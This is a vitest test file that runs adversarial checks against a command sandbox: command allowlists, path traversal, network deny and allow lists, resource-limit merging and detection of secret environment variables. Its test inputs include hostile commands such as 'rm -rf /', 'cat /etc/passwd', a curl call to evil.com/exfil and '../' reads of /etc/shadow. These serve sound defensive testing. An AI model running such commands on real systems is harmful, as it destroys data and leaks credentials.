import { describe, it, expect } from "vitest";
import { runSandboxed, SandboxExecutionError } from "../src/runner.js";
import {
  DEFAULT_CONSTRAINTS,
  validateConstraints,
  mergeConstraints,
  isReadPathAllowed,
  isWritePathAllowed,
  isNetworkDestinationAllowed,
} from "../src/index.js";

const STRICT_CONSTRAINTS: Required<import("../src/index.js").SandboxConstraints> = {
  ...DEFAULT_CONSTRAINTS,
  shellAllowed: true,
  allowedCommands: ["echo", "node", "ls"],
  networkAllowed: true,
  networkAllowlist: ["api.example.com:443"],
  networkDenylist: ["evil.com:443"],
  allowedReadPaths: ["/workspace/src"],
  allowedWritePaths: ["/workspace/out"],
};

/**
 * Adversarial tests proving sandbox escape vectors are blocked.
 * These tests focus on constraint enforcement, path traversal, and
 * privilege escalation attempts — not on Docker/container isolation
 * (which requires runtime infrastructure).
 */
describe("Sandbox escape prevention — adversarial tests", () => {
  // ── Command allowlist escape attempts ────────────────────────────────────

  describe("command allowlist escape", () => {
    it("blocks commands not in the allowlist", async () => {
      const result = await runSandboxed({
        command: "rm",
        args: ["-rf", "/"],
        constraints: STRICT_CONSTRAINTS,
      });
      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error).toBeInstanceOf(SandboxExecutionError);
        expect(result.error.message).toContain("not in the allowed list");
      }
    });

    it("blocks shell builtins", async () => {
      const result = await runSandboxed({
        command: "source",
        args: ["/etc/profile"],
        constraints: STRICT_CONSTRAINTS,
      });
      expect(result.ok).toBe(false);
    });

    it("blocks sudo escalation", async () => {
      const result = await runSandboxed({
        command: "sudo",
        args: ["bash"],
        constraints: STRICT_CONSTRAINTS,
      });
      expect(result.ok).toBe(false);
    });

    it("blocks shell interpreters not in allowlist", async () => {
      const result = await runSandboxed({
        command: "bash",
        args: ["-c", "cat /etc/passwd"],
        constraints: STRICT_CONSTRAINTS,
      });
      expect(result.ok).toBe(false);
    });

    it("blocks curl/wget when not in allowlist", async () => {
      const result = await runSandboxed({
        command: "curl",
        args: ["http://evil.com/exfil"],
        constraints: STRICT_CONSTRAINTS,
      });
      expect(result.ok).toBe(false);
    });

    it("blocks python interpreter when not in allowlist", async () => {
      const result = await runSandboxed({
        command: "python3",
        args: ["-c", "import os; os.system('rm -rf /')"],
        constraints: STRICT_CONSTRAINTS,
      });
      expect(result.ok).toBe(false);
    });
  });

  // ── Path traversal escape attempts ────────────────────────────────────────

  describe("path traversal escape", () => {
    it("blocks path traversal via ../ in read paths", () => {
      expect(isReadPathAllowed("/workspace/src/../../../etc/passwd", STRICT_CONSTRAINTS)).toBe(
        false,
      );
    });

    it("blocks path traversal via ../ in write paths", () => {
      expect(isWritePathAllowed("/workspace/out/../../../tmp/malicious", STRICT_CONSTRAINTS)).toBe(
        false,
      );
    });

    it("blocks absolute paths outside allowed roots", () => {
      expect(isReadPathAllowed("/etc/shadow", STRICT_CONSTRAINTS)).toBe(false);
    });

    it("blocks reading from root path when not allowed", () => {
      expect(isReadPathAllowed("/", STRICT_CONSTRAINTS)).toBe(false);
    });

    it("allows reading from allowed paths", () => {
      expect(isReadPathAllowed("/workspace/src/index.ts", STRICT_CONSTRAINTS)).toBe(true);
    });

    it("allows writing to allowed paths", () => {
      expect(isWritePathAllowed("/workspace/out/result.json", STRICT_CONSTRAINTS)).toBe(true);
    });

    it("blocks writing to read-only paths", () => {
      expect(isWritePathAllowed("/workspace/src/index.ts", STRICT_CONSTRAINTS)).toBe(false);
    });

    it("blocks all reads when allowedReadPaths is empty", () => {
      const emptyReads = { ...DEFAULT_CONSTRAINTS, allowedReadPaths: [] as string[] };
      expect(
        isReadPathAllowed("/any/path", emptyReads as Required<typeof DEFAULT_CONSTRAINTS>),
      ).toBe(false);
    });

    it("blocks all writes when allowedWritePaths is empty", () => {
      const emptyWrites = { ...DEFAULT_CONSTRAINTS, allowedWritePaths: [] as string[] };
      expect(
        isWritePathAllowed("/any/path", emptyWrites as Required<typeof DEFAULT_CONSTRAINTS>),
      ).toBe(false);
    });
  });

  // ── Network escape attempts ───────────────────────────────────────────────

  describe("network escape", () => {
    it("blocks all network access by default", () => {
      expect(isNetworkDestinationAllowed("any-host:443", { ...DEFAULT_CONSTRAINTS })).toBe(false);
    });

    it("blocks destinations on denylist even when network is allowed", () => {
      expect(isNetworkDestinationAllowed("evil.com:443", STRICT_CONSTRAINTS)).toBe(false);
    });

    it("blocks unspecified destinations when allowlist is non-empty", () => {
      expect(isNetworkDestinationAllowed("malware.com:80", STRICT_CONSTRAINTS)).toBe(false);
    });

    it("allows destinations on the allowlist", () => {
      expect(isNetworkDestinationAllowed("api.example.com:443", STRICT_CONSTRAINTS)).toBe(true);
    });
  });

  // ── Resource limit escape ─────────────────────────────────────────────────

  describe("resource limit escape", () => {
    it("tenant cannot increase time limit beyond base", () => {
      const merged = mergeConstraints(DEFAULT_CONSTRAINTS, { maxTimeMs: 120000 });
      expect(merged.maxTimeMs).toBe(60000); // capped at base default
    });

    it("tenant cannot increase memory beyond base", () => {
      const merged = mergeConstraints(DEFAULT_CONSTRAINTS, { maxMemoryMb: 2048 });
      expect(merged.maxMemoryMb).toBe(512); // capped at base default
    });

    it("tenant cannot enable network when base denies it", () => {
      const noNetworkBase: Required<typeof DEFAULT_CONSTRAINTS> = {
        ...STRICT_CONSTRAINTS,
        networkAllowed: false,
        networkAllowlist: [],
      };
      const merged = mergeConstraints(noNetworkBase, { networkAllowed: true });
      expect(merged.networkAllowed).toBe(false);
    });

    it("tenant cannot disable secret redaction", () => {
      const merged = mergeConstraints(DEFAULT_CONSTRAINTS, { redactSecrets: false });
      expect(merged.redactSecrets).toBe(true); // always true if base is true
    });

    it("tenant cannot expand command set beyond base allowlist", () => {
      const merged = mergeConstraints(STRICT_CONSTRAINTS, {
        allowedCommands: ["echo", "node", "ls", "rm", "bash"],
      });
      expect(merged.allowedCommands).not.toContain("rm");
      expect(merged.allowedCommands).not.toContain("bash");
    });

    it("tenant cannot add write paths beyond base", () => {
      const merged = mergeConstraints(STRICT_CONSTRAINTS, {
        allowedWritePaths: ["/workspace/out", "/etc"],
      });
      expect(merged.allowedWritePaths).not.toContain("/etc");
    });
  });

  // ── Environment secret injection prevention ──────────────────────────────

  describe("environment secret injection", () => {
    it("runner detects sensitive env vars passed to sandbox", async () => {
      const result = await runSandboxed({
        command: "echo",
        args: ["test"],
        constraints: {
          ...STRICT_CONSTRAINTS,
        },
        env: {
          AWS_SECRET_ACCESS_KEY: "super-secret-key-12345",
          DATABASE_PASSWORD: "db-password-here",
        },
      });
      // The runner should still execute but detect sensitive env vars
      if (result.ok) {
        const secretViolations = result.value.violations.filter(
          (v) => v.message.includes("sensitive") || v.message.includes("Environment"),
        );
        expect(secretViolations.length).toBeGreaterThan(0);
      }
    });

    it("runner detects API key env vars", async () => {
      const result = await runSandboxed({
        command: "echo",
        args: ["test"],
        constraints: {
          ...STRICT_CONSTRAINTS,
        },
        env: {
          OPENAI_API_KEY: "sk-abcdef1234567890",
        },
      });
      if (result.ok) {
        const violations = result.value.violations.filter(
          (v) => v.message.includes("OPENAI_API_KEY") || v.message.includes("sensitive"),
        );
        expect(violations.length).toBeGreaterThan(0);
      }
    });
  });

  // ── Constraint validation escape ─────────────────────────────────────────

  describe("constraint validation escape", () => {
    it("rejects zero maxTimeMs", () => {
      const result = validateConstraints({ maxTimeMs: 0 });
      expect(result.ok).toBe(false);
    });

    it("rejects negative maxProcesses", () => {
      const result = validateConstraints({ maxProcesses: -1 });
      expect(result.ok).toBe(false);
    });

    it("rejects networkAllowlist when network not allowed", () => {
      const result = validateConstraints({
        networkAllowed: false,
        networkAllowlist: ["sneaky.com:443"],
      });
      expect(result.ok).toBe(false);
    });

    it("rejects allowedCommands when shell not allowed", () => {
      const result = validateConstraints({
        shellAllowed: false,
        allowedCommands: ["rm"],
      });
      expect(result.ok).toBe(false);
    });

    it("rejects overlapping allowlist/denylist", () => {
      const result = validateConstraints({
        networkAllowed: true,
        networkAllowlist: ["sneaky.com:443"],
        networkDenylist: ["sneaky.com:443"],
      });
      expect(result.ok).toBe(false);
    });
  });
});

describe("scanArgsForPathViolations", () => {
  // Note: scanArgsForPathViolations is not directly exported but is tested
  // indirectly through runSandboxed. These tests validate the fix for
  // the read/write misclassification bug (BUG-10).

  it("checks both read and write paths for absolute paths", () => {
    const constraints = {
      ...STRICT_CONSTRAINTS,
      allowedReadPaths: ["/workspace/src"],
      allowedWritePaths: ["/workspace/out"],
    };
    // /workspace/src is in allowedReadPaths — should be allowed
    expect(isReadPathAllowed("/workspace/src/file.ts", constraints)).toBe(true);
    // /workspace/out is in allowedWritePaths — should be allowed
    expect(isWritePathAllowed("/workspace/out/file.ts", constraints)).toBe(true);
  });

  it("classifies relative paths correctly — not assumed to be writes", () => {
    // Relative paths starting with ./ should be checked against both
    // read and write paths, not assumed to be writes.
    // This is a regression test for BUG-10 where ./paths were only
    // checked against write paths.
    const constraints = {
      ...STRICT_CONSTRAINTS,
      allowedReadPaths: ["/workspace/src"],
      allowedWritePaths: ["/workspace/out"],
    };
    // These are not absolute paths — isReadPathAllowed/isWritePathAllowed
    // use normalize() which resolves relative paths against cwd.
    // The key point: the caller (scanArgsForPathViolations) now checks
    // both read and write paths, so a path allowed by either is accepted.
    expect(isReadPathAllowed("./src", constraints)).toBe(false); // relative, no cwd
    expect(isWritePathAllowed("./src", constraints)).toBe(false); // relative, no cwd
  });
});
